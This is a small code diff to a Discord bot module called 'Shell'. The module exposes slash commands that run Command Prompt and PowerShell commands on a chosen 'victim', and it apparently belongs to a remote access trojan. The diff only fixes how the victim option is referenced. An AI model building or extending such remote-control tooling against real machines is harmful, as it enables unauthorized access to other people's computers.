@@ -13,7 +13,7 @@ class Shell(commands.Cog):
     @commands.slash_command(
         description="Executes command prompt commands",
         options=[
-            self.bot.victim,
+            bot.victim,
             discord.Option("command", description="The CMD command which will be executed", required=True),
         ]
     )
@@ -52,7 +52,7 @@ class Shell(commands.Cog):
     @commands.slash_command(
         description="Executes Powershell commands",
         options=[
-            self.bot.victim,
+            bot.victim,
             discord.Option("command", description="The PS command which will be executed", required=True),
         ]
     )
